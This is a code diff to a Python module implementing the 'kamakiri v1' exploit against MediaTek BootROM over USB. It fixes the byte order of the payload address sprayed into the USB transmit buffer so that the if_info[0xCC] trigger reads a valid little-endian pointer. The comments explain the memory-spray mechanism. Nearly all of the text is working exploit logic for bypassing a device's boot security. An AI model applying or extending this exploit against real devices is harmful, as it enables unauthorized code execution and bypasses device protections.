@@ -16,7 +16,7 @@ Two BROM exploit families exist in the wild:
 This module implements the v1 flow.
 """
 
-from common import from_bytes
+from common import from_bytes, to_bytes
 from logger import log
 
 import usb.core
@@ -36,10 +36,13 @@ def kamakiri_v1(device, payload: bytes) -> None:
     log("Using kamakiri v1 (SEND_CERT upload, wIndex 0xCC trigger)")
 
     # Spray the payload address into usbacm_tx_buf via read32 echo:
-    # each read32() echoes its address bytes through the TX buffer, planting
-    # 0x00100A00 at the offsets later indexed by if_info[0xCC].
+    # each command echoes its raw argument bytes through the TX buffer, and
+    # the trigger reads if_info[0xCC] as a LITTLE-ENDIAN pointer.  write32()
+    # puts its word on the wire big-endian, so pre-byteswap the value here
+    # (same double-swap as bypass_utility) to plant the little-endian bytes
+    # of PAYLOAD_ADDRESS (00 0a 10 00) at the if_info[0xCC] slot.
     addr = WATCHDOG + 0x50
-    device.write32(addr, PAYLOAD_ADDRESS)
+    device.write32(addr, from_bytes(to_bytes(PAYLOAD_ADDRESS, 4), 4, "<"))
     cnt = 15
     for i in range(cnt):
         device.read32(addr - (cnt - i) * 4, cnt - i + 1)
